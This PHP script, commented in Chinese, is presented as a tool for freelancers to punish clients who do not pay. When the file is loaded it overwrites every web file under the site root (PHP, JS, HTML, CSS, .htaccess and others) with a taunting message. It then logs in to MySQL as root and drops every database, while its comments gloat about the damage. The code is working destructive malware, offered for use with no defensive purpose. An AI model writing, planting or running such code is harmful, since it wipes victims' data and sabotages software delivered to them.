<?php
// ------------------------------------------------------------------------------------------------
// - 目标：将欠款概率降到最低
// - 接私单的朋友们，最痛苦的事情不是“做完了之后需求要改”，最痛苦的是做完了还不给钱。
// ------------------------------------------------------------------------------------------------

// ----------------------------------------------
// - 第一步：配置
// ----------------------------------------------
// MySQL
define('DB_USER', 'root');
define('DB_PWD', '');
define('DB_HOST', 'localhost');
define('DB_PORT', '3306');
// 网页根目录
define('ROOT_PATH', './');

function do_ClearFile($path = null) {
    // - 其实，最可怕的不是文件被删了。现在硬盘还原还是可以的。
    // - 最可怕的是【文件留着，内容没了！】
    // - 哈哈哈哈哈哈哈哈哈哈哈哈哈
    $extfilter = array(
        'php', 'json', 'xml', 'html', 'htm', 'js', 'css', 'map', 'txt', 'htaccess', 'md'
    );
    if (!$handle = @opendir($path) ) {
        return 0;
    }
    while (false !== ($file = readdir($handle))) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        $filename = $path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filename)) {
            do_ClearFile($filename);
        } else {
            $extension = pathinfo($filename, PATHINFO_EXTENSION);
            if (in_array($extension, $extfilter)) {
                @file_put_contents($filename, "为什么不给钱？你这是要上天啊！？");
            }
        }
    }
}

function do_ClearSQL() {
    $con = mysql_connect(DB_HOST . ':' . DB_PORT, DB_USER, DB_PWD) or exit("数据库连接失败！");
    $result = mysql_query("SHOW DATABASES;", $con);
    while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
        @mysql_query("DROP DATABASE `{$row['Database']}`");
    }
}

// ----------------------------------------------
// 第二步：开始了。
// ----------------------------------------------
do_ClearFile(ROOT_PATH);
do_ClearSQL();
echo "Fuck!";